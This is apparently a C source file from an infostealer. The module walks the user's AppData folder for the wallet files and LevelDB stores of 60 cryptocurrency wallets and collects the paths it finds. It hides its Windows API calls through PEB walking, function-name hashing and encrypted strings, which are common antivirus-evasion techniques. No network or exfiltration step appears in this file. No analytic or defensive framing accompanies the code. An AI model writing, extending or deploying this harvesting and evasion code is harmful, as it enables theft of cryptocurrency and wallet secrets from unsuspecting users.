#include "wallet_desktop.h"
#include "hash.h"
#include "peb.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

typedef DWORD (WINAPI *pGetFileAttributesA_wd)(LPCSTR);

static struct {
    pGetFileAttributesA_wd pGFAA;
    int ready;
} g_wd_k32;

static int wd_ensure_k32(void) {
    if (g_wd_k32.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32]; enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    g_wd_k32.pGFAA = (pGetFileAttributesA_wd)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_wd_k32.pGFAA) return 0;
    g_wd_k32.ready = 1;
    return 1;
}

// 60 desktop wallet names and paths
static const char *desktop_names[] = {
    "Exodus", "Electrum", "Atomic Wallet", "Wasabi Wallet",
    "Coinomi", "Guarda Wallet", "Jaxx Liberty", "MultiBit HD",
    "Zcash", "Monero", "Bitcoin Core", "Litecoin Core",
    "Dogecoin Core", "Dash Core", "Armory", "Bytecoin",
    "MultiDoge", "Electrum-LTC", "Electron Cash", "Zcoin",
    "Bitcoin Gold", "Ethereum Wallet", "Binance Desktop", "Ledger Live",
    "Trezor Suite", "MyEtherWallet", "MyCrypto", "MetaMask Desktop",
    "Trust Wallet", "Bitcoin Wallet", "Litecoin Wallet", "Dash Wallet",
    "Vertcoin", "Groestlcoin", "Komodo", "PIVX",
    "MyMonero", "Jaxx",
    /* Solana */
    "Phantom Desktop", "Solflare Desktop", "Backpack",
    /* Cosmos */
    "Keplr Desktop",
    /* Polkadot */
    "Polkadot-JS Desktop",
    /* Cardano */
    "Daedalus", "Lace",
    /* Tezos */
    "Umami",
    /* Monero */
    "Feather Wallet",
    /* DeFi */
    "Rabby Desktop",
    /* Bitcoin-focused */
    "Sparrow Wallet", "Specter Desktop", "BlueWallet",
    "Phoenix Wallet", "Muun Wallet", "BTCPay Server",
    /* Additional */
    "Samourai Wallet", "Bisq", "Nunchuk",
    "Zelcore", "TokenPocket", "Safe Desktop"
};

static const char *desktop_paths[] = {
    "Exodus\\exodus.wallet",
    "Electrum\\wallets",
    "atomic\\Local Storage\\leveldb",
    "WalletWasabi\\Client\\Wallets",
    "Coinomi\\Coinomi\\wallets",
    "Guarda\\Local Storage\\leveldb",
    "Jaxx Liberty\\Local Storage\\leveldb",
    "MultiBitHD",
    "Zcash",
    "monero-project\\monero-core\\wallets",
    "Bitcoin",
    "Litecoin",
    "DogeCoin",
    "DashCore",
    "Armory",
    "bytecoin",
    "MultiDoge",
    "Electrum-LTC",
    "ElectronCash",
    "Firo",
    "BitcoinGold",
    "Ethereum\\keystore",
    "Binance\\Local Storage\\leveldb",
    "Ledger Live",
    "Trezor Suite",
    "MyEtherWallet",
    "MyCrypto",
    "MetaMask",
    "TrustWallet",
    "Bitcoin",
    "Litecoin",
    "Dash",
    "Vertcoin",
    "Groestlcoin",
    "Komodo",
    "PIVX",
    "MyMonero",
    "com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb",
    /* Solana */
    "Phantom\\Local Storage\\leveldb",
    "Solflare\\Local Storage\\leveldb",
    "Backpack\\Local Storage\\leveldb",
    /* Cosmos */
    "Keplr\\Local Storage\\leveldb",
    /* Polkadot */
    "polkadot-js\\Local Storage\\leveldb",
    /* Cardano */
    "Daedalus",
    "Lace",
    /* Tezos */
    "Umami",
    /* Monero */
    "FeatherWallet",
    /* DeFi */
    "Rabby\\Local Storage\\leveldb",
    /* Bitcoin-focused */
    "Sparrow",
    "SpecterDesktop",
    "BlueWallet",
    "Phoenix",
    "Muun",
    "BTCPayServer",
    /* Additional */
    "SamouraiWallet",
    "Bisq",
    "Nunchuk",
    "Zelcore",
    "TokenPocket\\Local Storage\\leveldb",
    "Safe\\Local Storage\\leveldb"
};

#define DESKTOP_WALLET_COUNT 60

WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *count) {
    *count = 0;
    
    WalletDesktopData *results = calloc(DESKTOP_WALLET_COUNT, sizeof(WalletDesktopData));
    if (!results) return NULL;
    
    size_t found = 0;
    for (size_t i = 0; i < DESKTOP_WALLET_COUNT; i++) {
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s\\%s", roaming_app_data, desktop_paths[i]);
        
        if (!wd_ensure_k32()) break;
        DWORD attr = g_wd_k32.pGFAA(full_path);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            results[found].name = strdup(desktop_names[i]);
            results[found].path = strdup(full_path);
            results[found].file_count = 0;
            results[found].files = NULL;
            found++;
        }
    }
    
    *count = found;
    if (found == 0) {
        free(results);
        return NULL;
    }
    return results;
}
